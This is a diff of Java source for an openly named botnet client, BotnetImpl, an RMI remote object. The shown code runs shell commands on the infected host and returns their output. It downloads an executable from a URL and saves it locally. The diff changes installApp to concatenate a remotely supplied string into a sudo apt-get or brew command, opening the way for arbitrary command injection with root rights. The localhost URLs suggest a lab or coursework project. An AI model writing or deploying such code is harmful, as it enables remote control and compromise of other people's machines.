@@ -54,7 +54,7 @@ public class BotnetImpl extends UnicastRemoteObject implements IBotnet{
             BufferedReader result = new BufferedReader(new InputStreamReader(process.getInputStream()));
             String s = null;
             while ((s = result.readLine()) != null) {
-//                System.out.println(s);
+                System.out.println(s);
                 arr.add(s);
             }
         } catch (IOException ex) {
@@ -63,15 +63,11 @@ public class BotnetImpl extends UnicastRemoteObject implements IBotnet{
         return arr;
     }
     
-     public ArrayList<String> winInstall(String command){
+    public ArrayList<String> winInstall(String command){
         try{
-            // example command: install test.exe
-            //example domain : http://localhost
             String domain = "";
             String[] splited = command.split("\\s");
-            // example url: http://localhost/test.exe
             if (splited[0].equals("install")) {
-//                String urlString = domain + "/" + splited[1
                 String urlString = "http://localhost/myweb/rufus-3.10.exe";
                 URL url = new URL(urlString);
                 String fileLocation = splited[1];
@@ -103,14 +99,14 @@ public class BotnetImpl extends UnicastRemoteObject implements IBotnet{
     }
     
     @Override
-    public ArrayList<String> installApp() throws RemoteException {
+    public ArrayList<String> installApp(String app) throws RemoteException {
         setOS(System.getProperty("os.name").toLowerCase());
         
         if(getOS().contains("linux")){
-            return runCommand("sudo apt-get install nmap -y && nmap -h");
+            return runCommand("sudo apt-get install " + app +" -y");
         }
         else if(getOS().contains("mac")){
-            return runCommand("/usr/local/bin/brew install nmap");
+            return runCommand("/usr/local/bin/brew install " + app);
         }
         else if(getOS().contains("win")){
             return winInstall("install unikey.exe");
